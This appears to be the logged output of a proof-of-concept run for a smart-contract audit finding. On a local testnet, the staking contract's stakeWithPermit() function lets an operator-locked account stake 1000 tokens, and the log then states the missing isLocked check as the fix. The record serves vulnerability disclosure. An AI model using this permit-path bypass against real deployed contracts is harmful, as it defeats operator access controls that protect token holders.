@@ -1,0 +1,39 @@
+======================================================================
+  SpaceCoin F5 -- Staking.stakeWithPermit() Missing isLocked Check
+  Operator Lock Bypass via ERC20 Permit Path
+======================================================================
+
+[*] Starting local Anvil testnet ...
+[*] Anvil running on http://127.0.0.1:8549 (PID 31027)
+[*] Running forge script: script/PocStakingIsLockedBypass.s.sol
+
+======================================================================
+  SpaceCoin F5 -- Staking.stakeWithPermit() Missing isLocked Check PoC
+======================================================================
+
+  [deploy] Token:    0x5FbDB2315678afecb367f032d93F642f64180aa3
+  [deploy] Staking:  0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
+  [deploy] Alice:    0x70997970C51812dc3A010C7d01b50e0d17dc79C8
+  [setup]  Operator locked Alice's account
+  [verify] Alice isLocked: true
+  === CHAIN A: Normal stake() ===
+  [expected] stake() would revert with AccountIsLocked for locked Alice
+  === BYPASS: stakeWithPermit() ===
+  [bypass] stakeWithPermit() SUCCEEDED for locked account
+  [bypass] Alice still locked: true
+  [bypass] Alice staked principal: 1000 tokens
+  === ATTACK CONFIRMED ===
+  stakeWithPermit() missing isLocked check.
+  Locked accounts bypass operator restrictions via permit path.
+  Fix: add  if (stakeInfo[owner].isLocked) revert AccountIsLocked();
+  ==========================
+
+======================================================================
+  RESULT: VULNERABILITY CONFIRMED
+  stakeWithPermit() does not check stakeInfo[owner].isLocked.
+  Locked accounts can bypass operator restrictions via permit path.
+  Fix: add isLocked check and amount==0 check to stakeWithPermit().
+======================================================================
+
+[*] Shutting down Anvil ...
+[*] Done.
